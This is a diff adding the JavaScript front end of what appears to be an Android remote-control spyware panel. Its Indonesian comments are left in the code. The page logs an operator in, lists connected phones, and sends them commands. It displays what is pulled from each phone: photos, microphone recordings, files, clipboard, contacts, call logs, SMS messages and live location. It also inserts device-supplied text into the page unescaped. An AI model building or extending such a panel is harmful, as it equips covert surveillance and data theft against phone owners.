@@ -1,0 +1,1157 @@
+// script.js
+
+// Enhanced Android Remote Control Script
+const API_BASE_URL = window.location.origin
+let ws
+let currentTab = "photos"
+
+document.addEventListener("DOMContentLoaded", () => {
+  setupEventListeners()
+  checkLoginStatus()
+  initializeTabs()
+})
+
+function setupEventListeners() {
+  // Authentication
+  document.getElementById("login-btn").addEventListener("click", login)
+  document.getElementById("logout-btn").addEventListener("click", logout)
+
+  // Device management
+  document.getElementById("refresh-devices-btn").addEventListener("click", fetchConnectedDevices)
+
+  // Clear functions
+  document.getElementById("clear-results-btn").addEventListener("click", clearAllResults)
+  document.getElementById("clear-messages-btn").addEventListener("click", clearMessages)
+
+  // Command buttons
+  document.querySelectorAll(".command-btn").forEach((button) => {
+    button.addEventListener("click", handleCommandClick)
+  })
+
+  // Tab switching
+  document.querySelectorAll(".tab-btn").forEach((button) => {
+    button.addEventListener("click", switchTab)
+  })
+
+  // Enter key support for login
+  document.getElementById("password").addEventListener("keypress", (e) => {
+    if (e.key === "Enter") login()
+  })
+
+  // Auto-refresh devices every 30 seconds
+  setInterval(() => {
+    if (localStorage.getItem("token") && document.getElementById("dashboard-container").style.display !== "none") {
+      fetchConnectedDevices()
+    }
+  }, 30000)
+}
+
+function initializeTabs() {
+  // Set initial tab
+  switchTab({ target: document.querySelector('.tab-btn[data-tab="photos"]') })
+}
+
+function switchTab(event) {
+  const targetTab = event.target.dataset.tab
+
+  // Update tab buttons
+  document.querySelectorAll(".tab-btn").forEach((btn) => btn.classList.remove("active"))
+  event.target.classList.add("active")
+
+  // Update tab content
+  document.querySelectorAll(".tab-content").forEach((content) => content.classList.remove("active"))
+  document.getElementById(`${targetTab}-tab`).classList.add("active")
+
+  currentTab = targetTab
+}
+
+async function handleCommandClick(event) {
+  const button = event.currentTarget
+  const command = button.dataset.command
+  const paramInputId = button.dataset.paramInput
+  const paramInputsId = button.dataset.paramInputs
+
+  let value1 = null
+  let value2 = null
+
+  // Get parameter values
+  if (paramInputId) {
+    const input = document.getElementById(paramInputId)
+    value1 = input.value.trim()
+    if (!value1) {
+      showNotification(`Please enter a value for ${command}`, "error")
+      input.focus()
+      return
+    }
+  } else if (paramInputsId) {
+    const ids = paramInputsId.split(",")
+    const input1 = document.getElementById(ids[0])
+    const input2 = document.getElementById(ids[1])
+    value1 = input1.value.trim()
+    value2 = input2.value.trim()
+    if (!value1 || !value2) {
+      showNotification(`Please enter both values for ${command}`, "error")
+      ;(!value1 ? input1 : input2).focus()
+      return
+    }
+  }
+
+  // Add loading state to button
+  const originalText = button.innerHTML
+  button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...'
+  button.disabled = true
+
+  try {
+    await sendCommand(command, value1, value2)
+
+    // Clear input fields after successful command
+    if (paramInputId) {
+      document.getElementById(paramInputId).value = ""
+    } else if (paramInputsId) {
+      const ids = paramInputsId.split(",")
+      ids.forEach((id) => (document.getElementById(id).value = ""))
+    }
+  } finally {
+    // Restore button state
+    setTimeout(() => {
+      button.innerHTML = originalText
+      button.disabled = false
+    }, 1000)
+  }
+}
+
+// Authentication Functions
+async function checkLoginStatus() {
+  const token = localStorage.getItem("token")
+  if (token) {
+    try {
+      // Validate token by making a test request
+      const response = await fetch(`${API_BASE_URL}/api/connected-devices`, {
+        headers: { Authorization: `Bearer ${token}` },
+      })
+
+      if (response.ok) {
+        initWebSocket(token)
+        showDashboard()
+        await fetchConnectedDevices()
+        // TAMBAHKAN BARIS INI:
+        await loadExistingFiles()
+      } else {
+        // Token is invalid
+        localStorage.removeItem("token")
+        showLogin()
+      }
+    } catch (error) {
+      console.error("Token validation error:", error)
+      showLogin()
+    }
+  } else {
+    showLogin()
+  }
+}
+
+async function login() {
+  const username = document.getElementById("username").value.trim()
+  const password = document.getElementById("password").value
+  const messageElem = document.getElementById("login-message")
+  const loginBtn = document.getElementById("login-btn")
+
+  if (!username || !password) {
+    showMessage(messageElem, "Please enter both username and password", "error")
+    return
+  }
+
+  // Show loading state
+  const originalBtnText = loginBtn.innerHTML
+  loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...'
+  loginBtn.disabled = true
+  showMessage(messageElem, "Authenticating...", "info")
+
+  try {
+    const response = await fetch(`${API_BASE_URL}/api/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, password }),
+    })
+
+    const data = await response.json()
+
+    if (response.ok && data.success) {
+      localStorage.setItem("token", data.token)
+      showMessage(messageElem, "Login successful! Redirecting...", "success")
+
+      setTimeout(async () => {
+  showDashboard()
+  initWebSocket(data.token)
+  await fetchConnectedDevices()
+  await loadExistingFiles()
+}, 1000)
+    } else {
+      showMessage(messageElem, data.message || "Invalid credentials", "error")
+    }
+  } catch (error) {
+    console.error("Login error:", error)
+    showMessage(messageElem, "Connection error. Please try again.", "error")
+  } finally {
+    // Restore button state
+    setTimeout(() => {
+      loginBtn.innerHTML = originalBtnText
+      loginBtn.disabled = false
+    }, 1000)
+  }
+}
+
+function logout() {
+  localStorage.removeItem("token")
+  if (ws) {
+    ws.close()
+    ws = null
+  }
+  showLogin()
+  clearAllResults()
+  clearMessages()
+  updateConnectionStatus(false)
+
+  // Reset device list
+  document.getElementById("device-list").innerHTML =
+    '<div class="loading-spinner"><i class="fas fa-spinner fa-spin"></i> Loading devices...</div>'
+  document.getElementById("selected-device-uuid").innerHTML = '<option value="">-- Select a device --</option>'
+}
+
+function showLogin() {
+  document.getElementById("login-container").style.display = "block"
+  document.getElementById("dashboard-container").style.display = "none"
+  document.getElementById("username").focus()
+}
+
+function showDashboard() {
+  const token = localStorage.getItem("token")
+  if (token) {
+    try {
+      const payload = JSON.parse(atob(token.split(".")[1]))
+      document.getElementById("welcome-user").textContent = payload.username
+    } catch (e) {
+      document.getElementById("welcome-user").textContent = "User"
+    }
+  }
+  document.getElementById("login-container").style.display = "none"
+  document.getElementById("dashboard-container").style.display = "block"
+}
+
+// Device Management
+async function fetchConnectedDevices() {
+  const token = localStorage.getItem("token")
+  if (!token) {
+    showLogin()
+    return
+  }
+
+  const deviceListElem = document.getElementById("device-list")
+  const deviceSelectElem = document.getElementById("selected-device-uuid")
+
+  // Show loading state
+  deviceListElem.innerHTML =
+    '<div class="loading-spinner"><i class="fas fa-spinner fa-spin"></i> Fetching devices...</div>'
+
+  try {
+    const response = await fetch(`${API_BASE_URL}/api/connected-devices`, {
+      headers: { Authorization: `Bearer ${token}` },
+    })
+
+    if (response.status === 401 || response.status === 403) {
+      showNotification("Session expired. Please login again.", "error")
+      logout()
+      return
+    }
+
+    const devices = await response.json()
+    const currentSelection = deviceSelectElem.value
+
+    if (Object.keys(devices).length === 0) {
+      deviceListElem.innerHTML = `
+                <div class="empty-state">
+                    <i class="fas fa-mobile-alt"></i>
+                    <p>No devices connected</p>
+                </div>
+            `
+      deviceSelectElem.innerHTML = '<option value="">-- No devices available --</option>'
+    } else {
+      let html = "<ul>"
+      deviceSelectElem.innerHTML = '<option value="">-- Select a device --</option>'
+
+      for (const uuid in devices) {
+        const device = devices[uuid]
+        html += `
+                    <li>
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <div>
+                                <strong><i class="fas fa-mobile-alt"></i> ${device.model}</strong>
+                                <br>
+                                <small style="color: var(--text-muted);">UUID: ${uuid.substring(0, 8)}...</small>
+                            </div>
+                            <div style="text-align: right; font-size: 0.85rem; color: var(--text-secondary);">
+                                <div><i class="fas fa-battery-half"></i> ${device.battery}</div>
+                                <div><i class="fas fa-android"></i> ${device.version}</div>
+                                <div><i class="fas fa-sun"></i> ${device.brightness}</div>
+                                <div><i class="fas fa-wifi"></i> ${device.provider}</div>
+                            </div>
+                        </div>
+                    </li>
+                `
+
+        const option = document.createElement("option")
+        option.value = uuid
+        option.textContent = `${device.model} (${uuid.substring(0, 8)}...)`
+        if (uuid === currentSelection) {
+          option.selected = true
+        }
+        deviceSelectElem.appendChild(option)
+      }
+      html += "</ul>"
+      deviceListElem.innerHTML = html
+    }
+  } catch (error) {
+    console.error("Error fetching devices:", error)
+    deviceListElem.innerHTML = `
+            <div class="empty-state">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>Failed to fetch devices</p>
+            </div>
+        `
+  }
+}
+
+async function loadExistingFiles() {
+  const token = localStorage.getItem("token")
+  if (!token) return
+
+  try {
+    const response = await fetch(`${API_BASE_URL}/api/uploads`, {
+      headers: { Authorization: `Bearer ${token}` }
+    })
+
+    if (!response.ok) return
+
+    const files = await response.json()
+    
+    // Kelompokkan file berdasarkan tipe
+    const imageFiles = files.filter(file => file.type === 'image')
+    const audioFiles = files.filter(file => file.type === 'audio')
+    const textFiles = files.filter(file => file.type === 'text')
+    const otherFiles = files.filter(file => !['image', 'audio', 'text'].includes(file.type))
+    
+    // Load setiap kategori
+    if (imageFiles.length > 0) {
+      const photoContainer = document.getElementById("photo-results")
+      removeEmptyState(photoContainer)
+      imageFiles.forEach(file => {
+        const timestamp = new Date(file.modified).toLocaleString()
+        addExistingPhotoResult(file, timestamp)
+      })
+    }
+    
+    if (audioFiles.length > 0) {
+      const audioContainer = document.getElementById("microphone-results")
+      removeEmptyState(audioContainer)
+      audioFiles.forEach(file => {
+        const timestamp = new Date(file.modified).toLocaleString()
+        addExistingAudioResult(file, timestamp)
+      })
+    }
+    
+    if (textFiles.length > 0) {
+      const textContainer = document.getElementById("text-results")
+      removeEmptyState(textContainer)
+      textFiles.forEach(file => {
+        const timestamp = new Date(file.modified).toLocaleString()
+        addExistingTextResult(file, timestamp)
+      })
+    }
+    
+    if (otherFiles.length > 0) {
+      const fileContainer = document.getElementById("file-results")
+      removeEmptyState(fileContainer)
+      otherFiles.forEach(file => {
+        const timestamp = new Date(file.modified).toLocaleString()
+        addExistingFileResult(file, timestamp)
+      })
+    }
+  } catch (error) {
+    console.error("Error loading existing files:", error)
+  }
+}
+
+// Fungsi untuk menambahkan foto yang sudah ada ke hasil
+function addExistingPhotoResult(fileData, timestamp) {
+  const container = document.getElementById("photo-results");
+
+  const resultItem = createResultItem(
+    `Photo :`,
+    timestamp,
+    `<img src="${fileData.url}" alt="${fileData.filename}" onclick="openImageModal('${fileData.url}', '${fileData.filename}')" style="max-width: 100%; height: auto; border-radius: 8px; cursor: pointer;">`
+  );
+
+  // Tambahkan styling langsung agar item tidak membuat kolom memanjang
+  resultItem.style.maxWidth = "300px";
+  resultItem.style.wordBreak = "break-word";
+  resultItem.style.margin = "8px";
+
+  container.appendChild(resultItem);
+}
+
+// Command Execution
+async function sendCommand(command, value1 = null, value2 = null) {
+  const uuid = document.getElementById("selected-device-uuid").value
+  if (!uuid) {
+    showNotification("Please select a device first!", "error")
+    return
+  }
+
+  const token = localStorage.getItem("token")
+  if (!token) {
+    showNotification("Authentication required!", "error")
+    logout()
+    return
+  }
+
+  updateStatus(`Sending '${command}' command...`, "info")
+
+  try {
+    const response = await fetch(`${API_BASE_URL}/api/command/${uuid}`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: `Bearer ${token}`,
+      },
+      body: JSON.stringify({ command, value1, value2 }),
+    })
+
+    const result = await response.json()
+
+    if (response.ok && result.success) {
+      updateStatus(`Command '${command}' sent successfully! Waiting for response...`, "success")
+      showNotification(`Command '${command}' executed successfully`, "success")
+    } else {
+      updateStatus(`Failed to send command: ${result.message}`, "error")
+      showNotification(`Command failed: ${result.message}`, "error")
+    }
+  } catch (error) {
+    console.error("Command error:", error)
+    updateStatus(`Error sending command: ${error.message}`, "error")
+    showNotification("Network error occurred", "error")
+  }
+}
+
+function addExistingAudioResult(fileData, timestamp) {
+  const container = document.getElementById("microphone-results")
+  
+  const resultItem = createResultItem(
+    `Audio Recording`,
+    timestamp,
+    `
+    <audio controls style="width: 100%; margin-bottom: 10px;">
+        <source src="${fileData.url}" type="${fileData.mimetype}">
+        Your browser does not support the audio element.
+    </audio>
+    <p><a href="${fileData.url}" target="_blank"><i class="fas fa-download"></i> Download ${fileData.filename}</a></p>
+    `
+  )
+  
+  container.appendChild(resultItem)
+}
+
+function addExistingTextResult(fileData, timestamp) {
+  const container = document.getElementById("text-results")
+  
+  // Baca konten file teks jika memungkinkan
+  fetch(fileData.url)
+    .then(response => response.text())
+    .then(content => {
+      const resultItem = createResultItem(
+        `Text:`,
+        timestamp,
+        `<pre style="max-height: 300px; width: 100%; overflow-y: auto; background: var(--bg-secondary); padding: 15px; border-radius: 8px; white-space: pre-wrap; word-break: break-word;">${content}</pre>`
+      )
+      
+      resultItem.style.maxWidth = "300px";
+      resultItem.style.wordBreak = "break-word";
+      resultItem.style.margin = "8px";
+      
+      // Tambah tombol copy
+      const copyBtn = document.createElement("button")
+      copyBtn.className = "btn secondary-btn"
+      copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy'
+      copyBtn.onclick = () => copyToClipboard(content)
+      resultItem.querySelector("h5").appendChild(copyBtn)
+      
+      container.appendChild(resultItem)
+    })
+    .catch(error => {
+      console.error("Error reading text file:", error)
+      // Fallback jika tidak bisa dibaca
+      const resultItem = createResultItem(
+        `Text File: ${fileData.filename}`,
+        timestamp,
+        `<p><a href="${fileData.url}" target="_blank"><i class="fas fa-download"></i> Download ${fileData.filename}</a></p>`
+      )
+      container.appendChild(resultItem)
+    })
+}
+
+function addExistingFileResult(fileData, timestamp) {
+  const container = document.getElementById("file-results");
+
+  const fileIcon = getFileIcon(fileData.filename);
+
+  const resultItem = createResultItem(
+    `File:`,
+    timestamp,
+    `
+    <div style="
+      display: flex; 
+      align-items: flex-start; 
+      gap: 10px; 
+      max-width: 300px;
+      word-break: break-word;
+    ">
+      <i class="${fileIcon}" style="font-size: 2rem; color: var(--accent-primary);"></i>
+      <div style="overflow-wrap: break-word;">
+        <strong>${fileData.filename}</strong><br>
+        <small>Size: ${(fileData.size / 1024).toFixed(1)} KB</small><br>
+        <a href="${fileData.url}" target="_blank">
+          <i class="fas fa-download"></i> Download File
+        </a>
+      </div>
+    </div>
+    `
+  );
+
+  // Tambahkan styling pembatas lebar pada elemen `resultItem`
+  resultItem.style.maxWidth = "300px";
+  resultItem.style.wordBreak = "break-word";
+  resultItem.style.margin = "8px";
+
+  container.appendChild(resultItem);
+}
+
+// WebSocket Communication
+function initWebSocket(token) {
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    return
+  }
+
+  const protocol = window.location.protocol === "https:" ? "wss:" : "ws:"
+  const wsUrl = `${protocol}//${window.location.host}`
+
+  console.log("Connecting to WebSocket:", wsUrl) // Debug log
+
+  ws = new WebSocket(wsUrl)
+
+  ws.onopen = () => {
+    console.log("WebSocket connected")
+    updateConnectionStatus(true)
+    // Send authentication
+    ws.send(JSON.stringify({ type: "auth", token: token }))
+    console.log("Authentication sent to WebSocket")
+  }
+
+  ws.onmessage = (event) => {
+    try {
+      const data = JSON.parse(event.data)
+      console.log("WebSocket message received:", data) // Debug log
+      handleWebSocketMessage(data)
+    } catch (e) {
+      console.error("WebSocket message parse error:", e, "Raw data:", event.data)
+    }
+  }
+
+  ws.onclose = (event) => {
+    console.log("WebSocket disconnected:", event.code, event.reason)
+    updateConnectionStatus(false)
+
+    // Attempt reconnection if still logged in
+    if (localStorage.getItem("token")) {
+      console.log("Attempting WebSocket reconnection in 5 seconds...")
+      setTimeout(() => {
+        initWebSocket(localStorage.getItem("token"))
+      }, 5000)
+    }
+  }
+
+  ws.onerror = (error) => {
+    console.error("WebSocket error:", error)
+    updateConnectionStatus(false)
+  }
+}
+
+function handleWebSocketMessage(data) {
+  const selectedUuid = document.getElementById("selected-device-uuid").value
+
+  console.log("Received WebSocket message:", data)
+
+  switch (data.type) {
+    case "device_status":
+      fetchConnectedDevices()
+      const statusText = `Device ${data.device ? data.device.model : data.uuid} went ${data.status}`
+      updateStatus(statusText, data.status === "online" ? "success" : "error")
+      showNotification(statusText, data.status === "online" ? "success" : "info")
+      break
+
+    case "file_uploaded":
+      // PERBAIKAN: Selalu tampilkan di live log dulu
+      addAndroidMessage({
+        type: "android_message",
+        deviceUuid: data.deviceUuid,
+        model: data.model,
+        message: `File uploaded: ${data.filename} (${(data.size / 1024).toFixed(1)} KB)`,
+        timestamp: data.timestamp
+      })
+      
+      // Kemudian handle file upload untuk tab yang sesuai
+      if (data.deviceUuid === selectedUuid) {
+        handleFileUpload(data)
+      }
+      break
+
+    case "text_data":
+      // PERBAIKAN: Selalu tampilkan di live log dulu
+      addAndroidMessage({
+        type: "android_message",
+        deviceUuid: data.deviceUuid,
+        model: data.model,
+        message: `Text data received (${data.dataType}): ${data.content.substring(0, 100)}${data.content.length > 100 ? '...' : ''}`,
+        timestamp: data.timestamp
+      })
+      
+      // Kemudian handle text data untuk tab yang sesuai
+      if (data.deviceUuid === selectedUuid) {
+        handleTextData(data)
+      }
+      break
+
+    case "location_data":
+      // PERBAIKAN: Selalu tampilkan di live log dulu
+      addAndroidMessage({
+        type: "android_message",
+        deviceUuid: data.deviceUuid,
+        model: data.model,
+        message: `Location shared: ${data.lat}, ${data.lon}`,
+        timestamp: data.timestamp
+      })
+      
+      // Kemudian handle location data untuk tab yang sesuai
+      if (data.deviceUuid === selectedUuid) {
+        handleLocationData(data)
+      }
+      break
+
+    case "android_message":
+      // Selalu tampilkan pesan Android di live log
+      console.log("Processing android_message:", data)
+      addAndroidMessage(data)
+      
+      // Jika dari device yang dipilih, tampilkan juga sebagai status
+      if (data.deviceUuid === selectedUuid) {
+        updateStatus(`${data.model}: ${data.message}`, "info")
+      }
+      break
+
+    case "command_response":
+      // Handle respons perintah khusus
+      console.log("Processing command_response:", data)
+      addAndroidMessage(data)
+      
+      if (data.deviceUuid === selectedUuid) {
+        const isSuccess = data.response.toLowerCase().includes("success") || 
+                         data.response.toLowerCase().includes("completed") ||
+                         data.response.toLowerCase().includes("sent")
+        
+        updateStatus(`${data.model}: ${data.response}`, isSuccess ? "success" : "error")
+        showNotification(`${data.model}: ${data.response}`, isSuccess ? "success" : "error")
+      }
+      break
+
+    case "ping":
+      // Respond to server ping
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ type: "pong" }))
+      }
+      break
+
+    default:
+      console.log("Unhandled WebSocket message:", data)
+  }
+}
+
+// Result Handlers
+function handleFileUpload(data) {
+  const timestamp = new Date().toLocaleString()
+
+  // Gunakan fileType yang dikirim dari server, fallback ke mimetype
+  const fileType = data.fileType || (function() {
+    if (data.mimetype && data.mimetype.startsWith("image/")) return 'image'
+    if (data.mimetype && data.mimetype.startsWith("audio/")) return 'audio'  
+    if (data.mimetype && data.mimetype.startsWith("text/")) return 'text'
+    return 'other'
+  })()
+
+  switch(fileType) {
+    case 'image':
+      addPhotoResult(data, timestamp)
+      switchToTab("photos")
+      break
+    case 'audio':
+      addAudioResult(data, timestamp)
+      switchToTab("audio")  
+      break
+    case 'text':
+      addTextFileResult(data, timestamp)
+      switchToTab("text")
+      break
+    default:
+      addFileResult(data, timestamp)
+      switchToTab("files")
+  }
+}
+
+function addTextFileResult(data, timestamp) {
+  const container = document.getElementById("text-results")
+  removeEmptyState(container)
+
+  // Baca konten file teks
+  fetch(data.url)
+    .then(response => response.text())
+    .then(content => {
+      const resultItem = createResultItem(
+        `Text File from ${data.model}: ${data.filename}`,
+        timestamp,
+        `<pre style="max-height: 300px; overflow-y: auto; background: var(--bg-secondary); padding: 15px; border-radius: 8px;">${content}</pre>`
+      )
+
+      // Tambah tombol copy
+      const copyBtn = document.createElement("button")
+      copyBtn.className = "btn secondary-btn" 
+      copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy'
+      copyBtn.onclick = () => copyToClipboard(content)
+      resultItem.querySelector("h5").appendChild(copyBtn)
+
+      container.appendChild(resultItem)
+      showNotification("Text file received!", "success")
+    })
+    .catch(error => {
+      console.error("Error reading text file:", error)
+      // Fallback
+      const resultItem = createResultItem(
+        `Text File from ${data.model}: ${data.filename}`,
+        timestamp,
+        `<p><a href="${data.url}" target="_blank"><i class="fas fa-download"></i> Download ${data.filename}</a></p>`
+      )
+      container.appendChild(resultItem)
+      showNotification("Text file received!", "success")
+    })
+}
+
+function handleTextData(data) {
+  const timestamp = new Date().toLocaleString()
+  addTextResult(data, timestamp)
+  switchToTab("text")
+}
+
+function handleLocationData(data) {
+  const timestamp = new Date().toLocaleString()
+  addLocationResult(data, timestamp)
+  switchToTab("location")
+}
+
+function addPhotoResult(data, timestamp) {
+  const container = document.getElementById("photo-results")
+  removeEmptyState(container)
+
+  const resultItem = createResultItem(
+    `Photo from ${data.model}`,
+    timestamp,
+    `<img src="${data.url}" alt="${data.filename}" onclick="openImageModal('${data.url}', '${data.filename}')">`,
+  )
+
+  container.appendChild(resultItem)
+  showNotification("Photo received!", "success")
+}
+
+function addAudioResult(data, timestamp) {
+  const container = document.getElementById("microphone-results")
+  removeEmptyState(container)
+
+  const resultItem = createResultItem(
+    `Audio Recording from ${data.model}`,
+    timestamp,
+    `
+        <audio controls>
+            <source src="${data.url}" type="${data.mimetype}">
+            Your browser does not support the audio element.
+        </audio>
+        <p><a href="${data.url}" target="_blank"><i class="fas fa-download"></i> Download ${data.filename}</a></p>
+        `,
+  )
+
+  container.appendChild(resultItem)
+  showNotification("Audio recording received!", "success")
+}
+
+function addFileResult(data, timestamp) {
+  const container = document.getElementById("file-results")
+  removeEmptyState(container)
+
+  const fileIcon = getFileIcon(data.filename)
+  const resultItem = createResultItem(
+    `File from ${data.model}`,
+    timestamp,
+    `
+        <div style="display: flex; align-items: center; gap: 10px;">
+            <i class="${fileIcon}" style="font-size: 2rem; color: var(--accent-primary);"></i>
+            <div>
+                <strong>${data.filename}</strong>
+                <br>
+                <a href="${data.url}" target="_blank"><i class="fas fa-download"></i> Download File</a>
+            </div>
+        </div>
+        `,
+  )
+
+  container.appendChild(resultItem)
+  showNotification("File received!", "success")
+}
+
+function addTextResult(data, timestamp) {
+  const container = document.getElementById("text-results")
+  removeEmptyState(container)
+
+  const icon = getTextDataIcon(data.dataType)
+  const resultItem = createResultItem(
+    `${data.dataType.charAt(0).toUpperCase() + data.dataType.slice(1)} from ${data.model}`,
+    timestamp,
+    `<pre>${data.content}</pre>`,
+  )
+
+  // Add copy button
+  const copyBtn = document.createElement("button")
+  copyBtn.className = "btn secondary-btn"
+  copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy'
+  copyBtn.onclick = () => copyToClipboard(data.content)
+  resultItem.querySelector("h5").appendChild(copyBtn)
+
+  container.appendChild(resultItem)
+  showNotification(`${data.dataType} data received!`, "success")
+}
+
+function addLocationResult(data, timestamp) {
+  const container = document.getElementById("location-results")
+  removeEmptyState(container)
+
+  const resultItem = createResultItem(
+    `Location from ${data.model}`,
+    timestamp,
+    `
+        <div class="location-item">
+            <div class="location-info">
+                <div class="location-coords">
+                    <i class="fas fa-map-marker-alt"></i> 
+                    Lat: ${data.lat}, Lon: ${data.lon}
+                </div>
+                <a href="https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lon}" target="_blank">
+                    <i class="fas fa-external-link-alt"></i> View on Google Maps
+                </a>
+            </div>
+            <button class="btn info-btn" onclick="copyToClipboard('${data.lat}, ${data.lon}')">
+                <i class="fas fa-copy"></i> Copy Coords
+            </button>
+        </div>
+        `,
+  )
+
+  container.appendChild(resultItem)
+  showNotification("Location received!", "success")
+}
+
+// Utility Functions
+function createResultItem(title, timestamp, content) {
+  const item = document.createElement("div")
+  item.className = "result-item"
+  item.innerHTML = `
+        <h5>
+            <span>${title}</span>
+            <small style="font-weight: normal; color: var(--text-muted);">${timestamp}</small>
+        </h5>
+        ${content}
+    `
+  return item
+}
+
+function removeEmptyState(container) {
+  const emptyState = container.querySelector(".empty-state")
+  if (emptyState) {
+    emptyState.remove()
+  }
+}
+
+function switchToTab(tabName) {
+  const tabBtn = document.querySelector(`.tab-btn[data-tab="${tabName}"]`)
+  if (tabBtn) {
+    tabBtn.click()
+  }
+}
+
+function getFileIcon(filename) {
+  const ext = filename.split(".").pop().toLowerCase()
+  const iconMap = {
+    pdf: "fas fa-file-pdf",
+    doc: "fas fa-file-word",
+    docx: "fas fa-file-word",
+    xls: "fas fa-file-excel",
+    xlsx: "fas fa-file-excel",
+    ppt: "fas fa-file-powerpoint",
+    pptx: "fas fa-file-powerpoint",
+    zip: "fas fa-file-archive",
+    rar: "fas fa-file-archive",
+    txt: "fas fa-file-alt",
+    mp4: "fas fa-file-video",
+    avi: "fas fa-file-video",
+    mp3: "fas fa-file-audio",
+    wav: "fas fa-file-audio",
+  }
+  return iconMap[ext] || "fas fa-file"
+}
+
+function getTextDataIcon(dataType) {
+  const iconMap = {
+    clipboard: "fas fa-clipboard",
+    apps: "fas fa-th",
+    device_info: "fas fa-info-circle",
+    calls: "fas fa-phone",
+    contacts: "fas fa-address-book",
+    messages: "fas fa-sms",
+  }
+  return iconMap[dataType] || "fas fa-file-text"
+}
+
+function addAndroidMessage(data) {
+  const logArea = document.getElementById("android-live-log")
+  
+  if (!logArea) {
+    console.error("Live log area not found!")
+    return
+  }
+  const timestamp = new Date().toLocaleTimeString()
+  
+  // Handle different message types
+  let message
+  let deviceName = data.model || "Unknown Device"
+  let deviceUuid = data.deviceUuid || "unknown"
+  
+  if (data.type === "command_response") {
+    message = `[${timestamp}] ${deviceName} (${deviceUuid.substring(0, 8)}): ${data.response}`
+  } else if (data.type === "android_message") {
+    message = `[${timestamp}] ${deviceName} (${deviceUuid.substring(0, 8)}): ${data.message}`
+  } else {
+    message = `[${timestamp}] ${deviceName} (${deviceUuid.substring(0, 8)}): ${data.message || data.response || 'Unknown message'}`
+  }
+  
+  console.log("Adding message to live log:", message)
+  
+  // Initialize log area if empty or contains placeholder
+  if (logArea.textContent === "No messages yet..." || logArea.textContent.trim() === "") {
+    logArea.textContent = message
+  } else {
+    logArea.textContent += "\n" + message
+  }
+  
+  // Auto-scroll to bottom
+  logArea.scrollTop = logArea.scrollHeight
+  
+  // Limit log size (keep only last 200 messages)
+  const lines = logArea.textContent.split('\n')
+  if (lines.length > 200) {
+    logArea.textContent = lines.slice(-200).join('\n')
+  }
+  
+  // Visual feedback - make it flash briefly
+  logArea.style.backgroundColor = 'rgba(74, 144, 226, 0.1)'
+  setTimeout(() => {
+    logArea.style.backgroundColor = ''
+  }, 500)
+  
+  // Update the message counter if exists
+  const messageCounter = document.getElementById("message-counter")
+  if (messageCounter) {
+    const currentCount = parseInt(messageCounter.textContent) || 0
+    messageCounter.textContent = currentCount + 1
+  }
+} // <-- Satu kurung kurawal penutup saja
+
+function copyToClipboard(text) {
+  navigator.clipboard
+    .writeText(text)
+    .then(() => {
+      showNotification("Copied to clipboard!", "success")
+    })
+    .catch(() => {
+      showNotification("Failed to copy to clipboard", "error")
+    })
+}
+
+function openImageModal(url, filename) {
+  const modal = document.createElement("div")
+  modal.style.cssText = `
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0,0,0,0.9); display: flex; align-items: center;
+        justify-content: center; z-index: 10000; cursor: pointer;
+    `
+
+  const img = document.createElement("img")
+  img.src = url
+  img.style.cssText = "max-width: 90%; max-height: 90%; border-radius: 8px;"
+
+  modal.appendChild(img)
+  modal.onclick = () => document.body.removeChild(modal)
+  document.body.appendChild(modal)
+}
+
+// UI Helper Functions
+function updateStatus(message, type) {
+  const statusElem = document.getElementById("status-message")
+  statusElem.innerHTML = `<i class="fas fa-${getStatusIcon(type)}"></i> ${message}`
+  statusElem.className = `message ${type}-message`
+}
+
+function getStatusIcon(type) {
+  const iconMap = {
+    success: "check-circle",
+    error: "exclamation-circle",
+    info: "info-circle",
+    warning: "exclamation-triangle",
+  }
+  return iconMap[type] || "info-circle"
+}
+
+function showMessage(element, message, type) {
+  element.innerHTML = `<i class="fas fa-${getStatusIcon(type)}"></i> ${message}`
+  element.className = `message ${type}-message`
+}
+
+function showNotification(message, type) {
+  // Create notification element
+  const notification = document.createElement("div")
+  notification.style.cssText = `
+        position: fixed; top: 20px; right: 20px; z-index: 10000;
+        padding: 15px 20px; border-radius: 8px; color: white;
+        font-weight: 500; box-shadow: var(--shadow-lg);
+        transform: translateX(100%); transition: transform 0.3s ease;
+        max-width: 300px; word-wrap: break-word;
+    `
+
+  // Set background color based on type
+  const colors = {
+    success: "var(--accent-success)",
+    error: "var(--accent-danger)",
+    info: "var(--accent-info)",
+    warning: "var(--accent-warning)",
+  }
+  notification.style.background = colors[type] || colors.info
+  notification.innerHTML = `<i class="fas fa-${getStatusIcon(type)}"></i> ${message}`
+
+  document.body.appendChild(notification)
+
+  // Animate in
+  setTimeout(() => {
+    notification.style.transform = "translateX(0)"
+  }, 100)
+
+  // Auto remove
+  setTimeout(() => {
+    notification.style.transform = "translateX(100%)"
+    setTimeout(() => {
+      if (document.body.contains(notification)) {
+        document.body.removeChild(notification)
+      }
+    }, 300)
+  }, 3000)
+}
+
+function updateConnectionStatus(connected) {
+  const statusElem = document.getElementById("connection-status")
+  if (connected) {
+    statusElem.innerHTML = '<i class="fas fa-circle"></i> Connected'
+    statusElem.style.color = "var(--accent-success)"
+    statusElem.style.borderColor = "var(--accent-success)"
+  } else {
+    statusElem.innerHTML = '<i class="fas fa-circle"></i> Disconnected'
+    statusElem.style.color = "var(--accent-danger)"
+    statusElem.style.borderColor = "var(--accent-danger)"
+  }
+}
+
+function clearAllResults() {
+  const containers = [
+    "photo-results",
+    "location-results",
+    "file-results",
+    "text-results",
+    "clipboard-results",
+    "microphone-results",
+  ]
+
+  containers.forEach((id) => {
+    const container = document.getElementById(id)
+    container.innerHTML = `
+            <div class="empty-state">
+                <i class="fas fa-${getEmptyStateIcon(id)}"></i>
+                <p>${getEmptyStateText(id)}</p>
+            </div>
+        `
+  })
+
+  updateStatus("All results cleared", "info")
+  showNotification("All results cleared", "info")
+}
+
